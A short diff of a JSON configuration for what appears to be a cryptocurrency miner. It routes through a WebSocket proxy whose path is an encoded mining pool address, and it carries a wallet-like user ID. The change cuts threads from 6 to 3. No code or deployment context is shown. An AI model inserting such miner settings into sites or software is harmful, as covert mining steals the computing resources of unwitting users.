@@ -1,6 +1,6 @@
 {
   "proxy": "ws://cpusocks2.teatspray.uk:9999/bWF6YXBvb2wudGVhdHNwcmF5LnVrOjg0NDI=",
-  "config": { "threads": 6, "log": true },
+  "config": { "threads": 3, "log": true },
   "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.Fallback", "password": "x", "argent": "nano-mino/1.0" }
 }
 
